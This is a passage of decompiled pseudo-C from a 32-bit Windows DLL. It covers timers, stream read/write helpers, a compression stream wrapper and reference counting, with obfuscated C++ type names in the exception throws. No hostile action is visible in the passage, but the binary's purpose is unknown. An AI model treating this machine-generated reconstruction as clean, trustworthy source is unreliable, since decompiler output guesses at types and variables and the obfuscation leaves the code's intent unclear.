  return a2;
}

//----- (1001C74E) --------------------------------------------------------
DWORD *__userpurge sub_1001C74E@<eax>(DWORD *a1@<esi>, DWORD a2)
{
  *a1 = GetTickCount();
  a1[1] = a2;
  return a1;
}

//----- (1001C765) --------------------------------------------------------
int __usercall sub_1001C765@<eax>(_DWORD *a1@<esi>)
{
  int result; // eax
  DWORD v2; // ecx
  DWORD v3; // eax

  result = -1;
  if ( a1[1] != -1 )
  {
    v2 = GetTickCount() - *a1;
    v3 = a1[1];
    if ( v2 <= v3 )
      return v3 - v2;
    else
      return 0;
  }
  return result;
}

//----- (1001C786) --------------------------------------------------------
bool __usercall sub_1001C786@<al>(_DWORD *a1@<eax>)
{
  return a1[1] != -1 && sub_1001C765(a1) == 0;
}

//----- (1001C7B1) --------------------------------------------------------
_DWORD *__stdcall sub_1001C7B1(_DWORD *a1)
{
  _DWORD *v1; // edx

  sub_100148B1(a1);
  *v1 = &off_1009402C;
  return v1;
}
// 1001C7CA: variable 'v1' is possibly undefined
// 1009402C: using guessed type int (__thiscall *off_1009402C)(void *Block, char);

//----- (1001C7DE) --------------------------------------------------------
_DWORD *__thiscall sub_1001C7DE(_DWORD *Block, char a2)
{
  sub_1001C7FD(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001C7FD) --------------------------------------------------------
void __thiscall sub_1001C7FD(_DWORD *this)
{
  *this = &off_1009402C;
  sub_100148FB(this);
}
// 1009402C: using guessed type int (__thiscall *off_1009402C)(void *Block, char);

//----- (1001C821) --------------------------------------------------------
int sub_1001C821()
{
  return 42;
}

//----- (1001C825) --------------------------------------------------------
int __stdcall sub_1001C825(int a1)
{
  int v2; // [esp+10h] [ebp-14h]

  v2 = sub_10014C70();
  return (*(int (__thiscall **)(int, int))(*(_DWORD *)a1 + 60))(a1, v2);
}

//----- (1001C862) --------------------------------------------------------
_DWORD *__stdcall sub_1001C862(_DWORD *a1, int a2)
{
  sub_1002F2CA((int)a1, a2, 1);
  *a1 = &off_10094050;
  return a1;
}
// 10094050: using guessed type int (__thiscall *off_10094050)(void *Block, char);

//----- (1001C894) --------------------------------------------------------
_BYTE *__thiscall sub_1001C894(_BYTE *Block, char a2)
{
  sub_1001C8B3(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001C8B3) --------------------------------------------------------
void __thiscall sub_1001C8B3(_BYTE *this)
{
  *(_DWORD *)this = &off_10094050;
  sub_1002F370(this);
  sub_1002F322(this);
}
// 10094050: using guessed type int (__thiscall *off_10094050)(void *Block, char);

//----- (1001C8F5) --------------------------------------------------------
char __fastcall sub_1001C8F5(int a1)
{
  char v2; // [esp+1h] [ebp-1h] BYREF

  v2 = HIBYTE(a1);
  (*(void (__stdcall **)(char *, int))(*(_DWORD *)a1 + 84))(&v2, 1);
  return v2;
}

//----- (1001C909) --------------------------------------------------------
bool __thiscall sub_1001C909(void *this)
{
  unsigned __int8 v1; // al
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 52))(this);
  if ( v1 >= 2u )
  {
    sub_10016590(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  return v1 == 1;
}
// 1001C909: using guessed type _DWORD pExceptionObject[2];

//----- (1001C93D) --------------------------------------------------------
__int16 __thiscall sub_1001C93D(void *this)
{
  void *v2; // [esp+0h] [ebp-4h] BYREF

  v2 = this;
  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 84))(this, &v2, 2);
  return (__int16)v2;
}

//----- (1001C952) --------------------------------------------------------
int __thiscall sub_1001C952(void *this)
{
  void *v2; // [esp+0h] [ebp-4h] BYREF

  v2 = this;
  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 84))(this, &v2, 4);
  return (int)v2;
}

//----- (1001C966) --------------------------------------------------------
double __thiscall sub_1001C966(void *this)
{
  double v2; // [esp+0h] [ebp-8h] BYREF

  (*(void (__thiscall **)(void *, double *, int))(*(_DWORD *)this + 84))(this, &v2, 8);
  return v2;
}

//----- (1001C97B) --------------------------------------------------------
int __thiscall sub_1001C97B(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int, int))(*(_DWORD *)this + 84))(this, a2, 8);
  return a2;
}

//----- (1001C98F) --------------------------------------------------------
_DWORD *__thiscall sub_1001C98F(void *this, _DWORD *a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  int v6[5]; // [esp+10h] [ebp-40h] BYREF
  int v7[3]; // [esp+24h] [ebp-2Ch] BYREF
  unsigned int v8; // [esp+30h] [ebp-20h]
  int v9[2]; // [esp+38h] [ebp-18h] BYREF
  int v10; // [esp+40h] [ebp-10h]
  int v11; // [esp+4Ch] [ebp-4h]

  v11 = 0;
  v10 = 0;
  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 80))(this, v7, 1);
  v11 = 1;
  sub_1000CC20(a2, word_100B7808);
  v10 = 1;
  if ( v8 >= 4 && sub_10016E72(v7, 0) == 0xFFFF )
  {
    v2 = (_DWORD *)sub_10016E32(v8 - 4, v7, (int)v6, 4);
    LOBYTE(v11) = 3;
    v3 = sub_1000CCE5(v2, v9);
    LOBYTE(v11) = 4;
    sub_10002C25(v3 + 1, a2 + 1);
    LOBYTE(v11) = 3;
    sub_1000CE59(v9);
    LOBYTE(v11) = 1;
    sub_10016B53(v6);
  }
  else
  {
    v4 = sub_1000CDFA(v9);
    LOBYTE(v11) = 2;
    sub_10002C25(v4 + 1, a2 + 1);
    LOBYTE(v11) = 1;
    sub_1000CE59(v9);
  }
  LOBYTE(v11) = 0;
  sub_10016B53(v7);
  return a2;
}
// 100B7808: using guessed type wchar_t word_100B7808[2];
// 1001C98F: using guessed type int var_2C[3];
// 1001C98F: using guessed type int var_40[5];

//----- (1001CA63) --------------------------------------------------------
_DWORD *__thiscall sub_1001CA63(int *this, _DWORD *a2, char a3)
{
  void *v4; // eax
  int v5; // eax
  _DWORD pExceptionObject[2]; // [esp+10h] [ebp-18h] BYREF
  int v8; // [esp+18h] [ebp-10h]
  int v9; // [esp+24h] [ebp-4h]

  v9 = 0;
  v8 = 0;
  v4 = (void *)(*(int (__thiscall **)(int *))(*this + 64))(this);
  if ( (unsigned int)v4 > 0x8000000 )
  {
    sub_10016590(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  sub_10016983(v4, (int)a2, 0);
  v9 = 0;
  v8 = 1;
  sub_10016F14(a2);
  v5 = *this;
  if ( a3 )
    (*(void (__thiscall **)(int *, _DWORD *))(v5 + 20))(this, a2);
  else
    (*(void (__thiscall **)(int *, _DWORD *))(v5 + 12))(this, a2);
  return a2;
}
// 1001CA63: using guessed type _DWORD pExceptionObject[2];

//----- (1001CAD5) --------------------------------------------------------
void __thiscall sub_1001CAD5(void *this, int a2, unsigned int a3)
{
  unsigned int i; // esi
  _DWORD pExceptionObject[2]; // [esp+8h] [ebp-8h] BYREF

  for ( i = 0; i < a3; ++i )
  {
    if ( !(*(int (__thiscall **)(void *, unsigned int))(*(_DWORD *)this + 16))(this, i + a2) )
    {
      sub_1001CB1A(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNxgFdIyuzpwZmeagwnxg_yq_sr__);
    }
  }
}
// 1001CAD5: using guessed type _DWORD pExceptionObject[2];

//----- (1001CB1A) --------------------------------------------------------
_DWORD *__stdcall sub_1001CB1A(_DWORD *a1)
{
  *a1 = &unk_10094044;
  sub_10016441(a1 + 1);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10093974;
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_1009403C;
  return a1;
}
// 10093974: using guessed type int (__stdcall *off_10093974)(char);
// 1009403C: using guessed type int (__stdcall *off_1009403C)(char);

//----- (1001CB6E) --------------------------------------------------------
void __thiscall sub_1001CB6E(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 1;
  sub_1001CC1C((int)(this + 1));
  sub_1001646C(v1);
}

//----- (1001CB80) --------------------------------------------------------
_DWORD *__thiscall sub_1001CB80(_DWORD *this, int a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10094044;
    if ( a2 )
      v4 = a2 + *(_DWORD *)(*(_DWORD *)a2 + 4);
    else
      v4 = 0;
    sub_10016406(this + 1, v4);
  }
  sub_10010A9E(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_1009403C;
  return this;
}
// 1009403C: using guessed type int (__stdcall *off_1009403C)(char);

//----- (1001CBEF) --------------------------------------------------------
_DWORD *__thiscall sub_1001CBEF(_DWORD *this, char a2)
{
  _DWORD *v2; // esi

  v2 = this - 1;
  sub_1001CC1C((int)this);
  sub_1001646C(this);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1001CC1C) --------------------------------------------------------
int __stdcall sub_1001CC1C(int a1)
{
  int result; // eax

  result = a1;
  *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a1 - 4) + 4) + a1 - 4) = &off_10093974;
  return result;
}
// 10093974: using guessed type int (__stdcall *off_10093974)(char);

//----- (1001CC45) --------------------------------------------------------
char sub_1001CC45()
{
  return 1;
}

//----- (1001CC48) --------------------------------------------------------
_DWORD *__stdcall sub_1001CC48(_DWORD *a1, int a2, char a3)
{
  sub_10022348((int)a1, a2, a3);
  *a1 = &off_100940A8;
  return a1;
}
// 100940A8: using guessed type int (__thiscall *off_100940A8)(void *Block, char);

//----- (1001CC7B) --------------------------------------------------------
_BYTE *__thiscall sub_1001CC7B(_BYTE *Block, char a2)
{
  sub_1001CC9A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001CC9A) --------------------------------------------------------
int __thiscall sub_1001CC9A(_BYTE *this)
{
  *(_DWORD *)this = &off_100940A8;
  sub_100223E2(this);
  return sub_100223A0(this);
}
// 100940A8: using guessed type int (__thiscall *off_100940A8)(void *Block, char);

//----- (1001CCDC) --------------------------------------------------------
void *__thiscall sub_1001CCDC(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, a2);
  return this;
}

//----- (1001CCF1) --------------------------------------------------------
_DWORD *__thiscall sub_1001CCF1(_DWORD *this, char a2)
{
  _DWORD *v2; // esi
  int v3; // eax

  v2 = this;
  v3 = *this;
  LOBYTE(this) = a2 != 0;
  (*(void (__thiscall **)(_DWORD *, _DWORD *))(v3 + 16))(v2, this);
  return v2;
}

//----- (1001CD0D) --------------------------------------------------------
void *__thiscall sub_1001CD0D(void *this, char a2)
{
  (*(void (__thiscall **)(void *, char *, int))(*(_DWORD *)this + 80))(this, &a2, 2);
  return this;
}

//----- (1001CD27) --------------------------------------------------------
void *__thiscall sub_1001CD27(void *this, char a2)
{
  (*(void (__thiscall **)(void *, char *, int))(*(_DWORD *)this + 80))(this, &a2, 4);
  return this;
}

//----- (1001CD41) --------------------------------------------------------
void *__thiscall sub_1001CD41(void *this, char a2, int a3)
{
  (*(void (__thiscall **)(void *, char *, int))(*(_DWORD *)this + 80))(this, &a2, 8);
  return this;
}

//----- (1001CD5B) --------------------------------------------------------
void *__thiscall sub_1001CD5B(void *this, char a2, int a3)
{
  (*(void (__thiscall **)(void *, char *, int))(*(_DWORD *)this + 80))(this, &a2, 8);
  return this;
}

//----- (1001CD75) --------------------------------------------------------
void *__thiscall sub_1001CD75(void *this, int a2, int a3)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 60))(this, 2 * *(_DWORD *)(a3 + 28) + 4);
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 60))(this, 0xFFFF);
  (*(void (__thiscall **)(void *, _DWORD, int))(*(_DWORD *)this + 80))(
    this,
    *(_DWORD *)(a3 + 12),
    2 * *(_DWORD *)(a3 + 28));
  sub_1000CE59(&a2);
  return this;
}

//----- (1001CDCD) --------------------------------------------------------
void *__thiscall sub_1001CDCD(void *this, int a2, int a3, int a4, int a5, int a6)
{
  int v7; // eax

  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 60))(this, a5);
  v7 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)v7 + 12))(v7, &a2);
  sub_10016B53(&a2);
  return this;
}

//----- (1001CE0F) --------------------------------------------------------
void __thiscall sub_1001CE0F(void *this, int a2, unsigned int a3)
{
  unsigned int i; // esi
  int v5; // eax

  for ( i = 0; i < a3; ++i )
  {
    v5 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
    (*(void (__thiscall **)(int, _DWORD))(*(_DWORD *)v5 + 16))(v5, *(unsigned __int8 *)(i + a2));
  }
}

//----- (1001CE3F) --------------------------------------------------------
char sub_1001CE3F()
{
  return 1;
}

//----- (1001CE42) --------------------------------------------------------
_DWORD *__userpurge sub_1001CE42@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  sub_1002F467((int)a2);
  *a2 = &off_100940FC;
  sub_10016AE9(a1, (int)(a2 + 2));
  a2[7] = 0;
  return a2;
}
// 100940FC: using guessed type int (__thiscall *off_100940FC)(void *Block, char);

//----- (1001CE80) --------------------------------------------------------
void *__thiscall sub_1001CE80(void *Block, char a2)
{
  sub_1001CE9F((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001CE9F) --------------------------------------------------------
void __thiscall sub_1001CE9F(int this)
{
  *(_DWORD *)this = &off_100940FC;
  *(_BYTE *)(this + 4) = 1;
  sub_10016B53((int *)(this + 8));
  sub_1002F4B5((_BYTE *)this);
}
// 100940FC: using guessed type int (__thiscall *off_100940FC)(void *Block, char);

//----- (1001CEF5) --------------------------------------------------------
int __thiscall sub_1001CEF5(int *this, _BYTE *a2)
{
  if ( (*(unsigned __int8 (__thiscall **)(int *))(*this + 28))(this) )
    return 0;
  *a2 = *(_BYTE *)sub_10016C51((int)(this + 2), this[7]++);
  return 1;
}

//----- (1001CF25) --------------------------------------------------------
size_t __thiscall sub_1001CF25(_DWORD *this, _DWORD *a2)
{
  unsigned int v5; // ebx
  size_t v6; // ebx
  void *v7; // eax
  const void *v8; // [esp-10h] [ebp-14h]
  char v9; // [esp+Fh] [ebp+Bh]

  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *))(*this + 28))(this) )
    return 0;
  v5 = a2[3];
  if ( v5 >= (*(int (__thiscall **)(_DWORD *))(*this + 24))(this) )
    v6 = (*(int (__thiscall **)(_DWORD *))(*this + 24))(this);
  else
    v6 = a2[3];
  v9 = *(_BYTE *)(a2[1] + 8);
  v8 = (const void *)(this[7] + sub_10016C24(this + 2));
  v7 = (void *)sub_10016C00(a2);
  memcpy(v7, v8, v6);
  if ( v9 )
    *(_BYTE *)(a2[1] + 8) = 1;
  this[7] += v6;
  return v6;
}

//----- (1001CF98) --------------------------------------------------------
int __thiscall sub_1001CF98(_DWORD *this)
{
  return this[5] - this[7];
}

//----- (1001CF9F) --------------------------------------------------------
BOOL __thiscall sub_1001CF9F(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 24))(this) == 0;
}

//----- (1001CFAA) --------------------------------------------------------
int __thiscall sub_1001CFAA(_DWORD *this, int a2)
{
  sub_10016AE9(this + 2, a2);
  return a2;
}

//----- (1001CFDB) --------------------------------------------------------
void __thiscall sub_1001CFDB(_DWORD *this)
{
  this[7] = 0;
}

//----- (1001CFE0) --------------------------------------------------------
int __thiscall sub_1001CFE0(_DWORD *this)
{
  return this[7];
}

//----- (1001CFE4) --------------------------------------------------------
int __thiscall sub_1001CFE4(_DWORD *this, int a2, int a3)
{
  int v3; // eax
  int result; // eax
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  v3 = 0;
  if ( a3 )
  {
    if ( a3 == 1 )
    {
      v3 = this[7];
    }
    else if ( a3 == 2 )
    {
      v3 = this[5];
    }
  }
  else
  {
    v3 = 0;
  }
  result = a2 + v3;
  if ( result < 0 || result > this[5] )
  {
    sub_10016590(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  this[7] = result;
  return result;
}
// 1001CFE4: using guessed type _DWORD pExceptionObject[2];

//----- (1001D02F) --------------------------------------------------------
char sub_1001D02F()
{
  return 1;
}

//----- (1001D032) --------------------------------------------------------
_DWORD *__stdcall sub_1001D032(_DWORD *a1)
{
  sub_1001D1C0(a1, 0);
  return a1;
}

//----- (1001D056) --------------------------------------------------------
void __stdcall sub_1001D056(void *a1)
{
  sub_1001D1FF(a1);
}

//----- (1001D076) --------------------------------------------------------
_DWORD *__stdcall sub_1001D076(_DWORD *a1, int a2)
{
  sub_100306CD(a1, a2);
  return a1;
}

//----- (1001D0A7) --------------------------------------------------------
int __usercall sub_1001D0A7@<eax>(_DWORD *a1@<edi>)
{
  int v1; // eax

  v1 = sub_1001D162(a1);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 4))(v1);
}

//----- (1001D0B7) --------------------------------------------------------
_DWORD *__userpurge sub_1001D0B7@<eax>(_DWORD *a1@<edi>, _DWORD *a2, int a3)
{
  int v3; // eax

  v3 = sub_1001D162(a1);
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3 + 8))(v3, a3);
  sub_1001D076(a2, a3);
  return a2;
}

//----- (1001D0F7) --------------------------------------------------------
LONG __stdcall sub_1001D0F7(int a1)
{
  int v2[5]; // [esp+10h] [ebp-18h] BYREF
  int v3; // [esp+24h] [ebp-4h]

  sub_1001D076(v2, a1);
  v3 = 0;
  sub_100307D2(v2);
  v3 = -1;
  return sub_1003078F(v2);
}
// 1001D0F7: using guessed type int var_18[5];

//----- (1001D134) --------------------------------------------------------
void __stdcall sub_1001D134(_DWORD *a1, int a2, int a3)
{
  sub_1001D22A(a1, &a2);
  sub_1001D1FF(&a2);
}

//----- (1001D162) --------------------------------------------------------
int __usercall sub_1001D162@<eax>(_DWORD *a1@<edi>)
{
  _DWORD *v1; // eax
  int v2; // ecx
  _DWORD *v3; // eax
  int v5; // [esp-8h] [ebp-28h] BYREF
  int v6; // [esp-4h] [ebp-24h]
  void *Block; // [esp+10h] [ebp-10h]
  int v8; // [esp+1Ch] [ebp-4h]

  if ( !*a1 )
  {
    v1 = operator new(8u);
    v2 = v6;
    Block = v1;
    v8 = 0;
    if ( v1 )
      v3 = sub_1002F607((void *)0xF003F, v1);
    else
      v3 = 0;
    v8 = -1;
    v6 = v2;
    v5 = v2;
    Block = &v5;
    sub_1001D1C0(&v5, (int)v3);
    v8 = -1;
    sub_1001D134(a1, v5, v6);
  }
  return *a1;
}
// 1001D19A: variable 'v2' is possibly undefined
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001D1C0) --------------------------------------------------------
_DWORD *__userpurge sub_1001D1C0@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001D1FF) --------------------------------------------------------
void __thiscall sub_1001D1FF(void *this)
{
  sub_1001D2A7((int)this);
}

//----- (1001D22A) --------------------------------------------------------
_DWORD *__usercall sub_1001D22A@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_1001D2A7((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (1001D24F) --------------------------------------------------------
void __usercall sub_1001D24F(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_1001D2A7((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001D2A7) --------------------------------------------------------
void __usercall sub_1001D2A7(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1001D2D9) --------------------------------------------------------
_DWORD *__stdcall sub_1001D2D9(_DWORD *a1)
{
  sub_1001D5B2(a1);
  a1[10] = 0;
  a1[11] = 0;
  a1[12] = 0;
  *a1 = &off_10094130;
  sub_1001D52B((int)a1);
  return a1;
}
// 10094130: using guessed type int (__thiscall *off_10094130)(void *Block, char);

//----- (1001D317) --------------------------------------------------------
void *__thiscall sub_1001D317(void *Block, char a2)
{
  sub_1001D336((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001D336) --------------------------------------------------------
void __thiscall sub_1001D336(int this)
{
  *(_DWORD *)this = &off_10094130;
  if ( !*(_BYTE *)(this + 65) )
    sub_1001D573(this, 1);
  sub_1001D603((_DWORD *)this);
}
// 10094130: using guessed type int (__thiscall *off_10094130)(void *Block, char);

//----- (1001D387) --------------------------------------------------------
int __thiscall sub_1001D387(_BYTE *this)
{
  if ( !this[65] )
    sub_1001D573((int)this, 1);
  return sub_1001D52B((int)this);
}

//----- (1001D3A1) --------------------------------------------------------
int __thiscall sub_1001D3A1(int this, int a2, _DWORD *a3, void *pExceptionObject, _DWORD *a5)
{
  void *v6; // ebx
  int v7; // eax
  int v8; // ebx
  int v10[3]; // [esp+10h] [ebp-24h] BYREF
  int v11; // [esp+1Ch] [ebp-18h]
  int v12; // [esp+24h] [ebp-10h]
  int v13; // [esp+30h] [ebp-4h]

  v12 = 0;
  v6 = pExceptionObject;
  *(_BYTE *)(this + 64) = 1;
  sub_10016983(v6, (int)v10, 0);
  v13 = 1;
  *(_DWORD *)(this + 20) = sub_10016C00(v10);
  *(_DWORD *)(this + 24) = v11;
  *(_DWORD *)(this + 8) = sub_10016C24(a3);
  *(_DWORD *)(this + 12) = a3[3];
  v7 = sub_1003177B(this + 8, 0);
  *(_BYTE *)(v10[1] + 8) = 1;
  if ( v7 )
  {
    sub_1002F278(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVOzxflwtlqlhGovvrdoxa_oqymxuuz_sr__);
  }
  v8 = v11 - *(_DWORD *)(this + 24);
  *a5 = a3[3] - *(_DWORD *)(this + 12);
  sub_10016DFF(v8, v10, a2, 0);
  v12 = 1;
  LOBYTE(v13) = 0;
  sub_10016B53(v10);
  return a2;
}

//----- (1001D457) --------------------------------------------------------
int __thiscall sub_1001D457(int this, int a2, void *pExceptionObject)
{
  int v4; // eax
  int v5; // edi
  int v7[3]; // [esp+10h] [ebp-24h] BYREF
  int v8; // [esp+1Ch] [ebp-18h]
  int v9; // [esp+24h] [ebp-10h]
  int v10; // [esp+30h] [ebp-4h]

  v9 = 0;
  if ( !*(_BYTE *)(this + 64) || *(_BYTE *)(this + 65) )
  {
    sub_10016983(0, a2, 0);
    v10 = 0;
    v9 = 1;
  }
  else
  {
    sub_10016983(pExceptionObject, (int)v7, 0);
    v10 = 1;
    *(_DWORD *)(this + 20) = sub_10016C00(v7);
    *(_DWORD *)(this + 24) = v8;
    v4 = sub_1003177B(this + 8, 4);
    *(_BYTE *)(v7[1] + 8) = 1;
    v5 = v8 - *(_DWORD *)(this + 24);
    if ( v4 )
    {
      if ( v4 != 1 )
      {
        sub_1002F278(&pExceptionObject);
        _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVOzxflwtlqlhGovvrdoxa_oqymxuuz_sr__);
      }
      sub_1001D573(this, 0);
    }
    sub_10016DFF(v5, v7, a2, 0);
    v9 = 1;
    LOBYTE(v10) = 0;
    sub_10016B53(v7);
  }
  return a2;
}

//----- (1001D52B) --------------------------------------------------------
int __usercall sub_1001D52B@<eax>(int a1@<eax>)
{
  int v1; // esi
  int result; // eax
  int pExceptionObject; // [esp+4h] [ebp-4h] BYREF

  v1 = a1 + 8;
  *(_BYTE *)(a1 + 64) = 0;
  *(_BYTE *)(a1 + 65) = 0;
  if ( sub_1003130C(a123, (_DWORD *)(a1 + 8), 9u) || (result = sub_1003162D(v1)) != 0 )
  {
    sub_1002F278(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVOzxflwtlqlhGovvrdoxa_oqymxuuz_sr__);
  }
  return result;
}

//----- (1001D573) --------------------------------------------------------
int __userpurge sub_1001D573@<eax>(int a1@<eax>, char pExceptionObject)
{
  int result; // eax

  *(_BYTE *)(a1 + 65) = 1;
  result = sub_10031EB8(a1 + 8);
  if ( !pExceptionObject || result != -3 )
  {
    if ( result )
    {
      sub_1002F278(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVOzxflwtlqlhGovvrdoxa_oqymxuuz_sr__);
    }
  }
  return result;
}

//----- (1001D5AE) --------------------------------------------------------
char __thiscall sub_1001D5AE(_BYTE *this)
{
  return this[64];
}

//----- (1001D5B2) --------------------------------------------------------
_DWORD *__stdcall sub_1001D5B2(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = &off_10094DC4;
  *a1 = &off_10094148;
  a1[1] = 1024;
  return result;
}
// 10094148: using guessed type int (__thiscall *off_10094148)(void *Block, char);
// 10094DC4: using guessed type int (__thiscall *off_10094DC4)(void *Block, char);

//----- (1001D5E4) --------------------------------------------------------
_DWORD *__thiscall sub_1001D5E4(_DWORD *Block, char a2)
{
  sub_1001D603(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001D603) --------------------------------------------------------
void __thiscall sub_1001D603(_DWORD *this)
{
  *this = &off_10094148;
  *this = &off_10094DC4;
}
// 10094148: using guessed type int (__thiscall *off_10094148)(void *Block, char);
// 10094DC4: using guessed type int (__thiscall *off_10094DC4)(void *Block, char);

//----- (1001D628) --------------------------------------------------------
int __thiscall sub_1001D628(_DWORD *this, int a2, int *pExceptionObject)
{
  _DWORD *v3; // esi
  int *v4; // edi
  unsigned int v5; // ebx
  int v6; // eax
  int *v7; // eax
  int v8; // eax
  unsigned int v9; // esi
  int v10; // edi
  int v12; // [esp-8h] [ebp-94h]
  int v13[9]; // [esp+10h] [ebp-7Ch] BYREF
  int v14[5]; // [esp+34h] [ebp-58h] BYREF
  int v15[5]; // [esp+48h] [ebp-44h] BYREF
  int v16[3]; // [esp+5Ch] [ebp-30h] BYREF
  int v17; // [esp+68h] [ebp-24h]
  int v18; // [esp+70h] [ebp-1Ch]
  _DWORD *v19; // [esp+74h] [ebp-18h]
  unsigned int v20; // [esp+78h] [ebp-14h]
  int v21[3]; // [esp+7Ch] [ebp-10h] BYREF
  int v22; // [esp+88h] [ebp-4h]

  v3 = this;
  v19 = this;
  v18 = 0;
  sub_10017D60(v13);
  v22 = 1;
  v4 = pExceptionObject;
  sub_10016AE9(pExceptionObject, (int)v15);
  LOBYTE(v22) = 2;
  v5 = v4[3];
  v6 = *v3;
  pExceptionObject = 0;
  v20 = v5;
  (*(void (__thiscall **)(_DWORD *))(v6 + 8))(v3);
  if ( v5 )
  {
    do
    {
      v7 = (int *)sub_10016DFF(v20 - (_DWORD)pExceptionObject, v4, (int)v14, (int)pExceptionObject);
      LOBYTE(v22) = 3;
      sub_10016B2F(v7, (int)v15);
      LOBYTE(v22) = 2;
      sub_10016B53(v14);
      v8 = *v19;
      v12 = v19[1];
      v21[0] = 0;
      (*(void (__stdcall **)(int *, int *, int, int *))(v8 + 12))(v16, v15, v12, v21);
      LOBYTE(v22) = 4;
      if ( !v17 && !v21[0] )
      {
        sub_10016441(&pExceptionObject);
        _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
      }
      pExceptionObject = (int *)((char *)pExceptionObject + v21[0]);
      v9 = (unsigned int)pExceptionObject;
      sub_10017E53(v13, v16);
      LOBYTE(v22) = 2;
      sub_10016B53(v16);
    }
    while ( v9 < v20 );
    v3 = v19;
  }
  do
  {
    (*(void (__thiscall **)(_DWORD *, int *, _DWORD))(*v3 + 16))(v3, v16, v3[1]);
    LOBYTE(v22) = 5;
    sub_10017E53(v13, v16);
    v10 = v17;
    LOBYTE(v22) = 2;
    sub_10016B53(v16);
  }
  while ( v10 );
  (*(void (__thiscall **)(_DWORD *))(*v3 + 8))(v3);
  sub_10017EAF(v13, a2);
  v18 = 1;
  LOBYTE(v22) = 1;
  sub_10016B53(v15);
  LOBYTE(v22) = 0;
  sub_10017DC3((int)v13);
  return a2;
}
// 1001D628: using guessed type int var_7C[9];
// 1001D628: using guessed type int var_44[5];
// 1001D628: using guessed type int var_58[5];
// 1001D628: using guessed type int var_10[3];
// 1001D628: using guessed type int var_30[3];

//----- (1001D77F) --------------------------------------------------------
_DWORD *__stdcall sub_1001D77F(_DWORD *a1)
{
  *a1 = 0;
  a1[1] = 0;
  sub_1000CC20(a1 + 2, word_100B76AC);
  return a1;
}
// 100B76AC: using guessed type wchar_t word_100B76AC[2];

//----- (1001D7B1) --------------------------------------------------------
_DWORD *__stdcall sub_1001D7B1(_DWORD *a1, int a2, int a3, int a4, int a5)
{
  *a1 = a2;
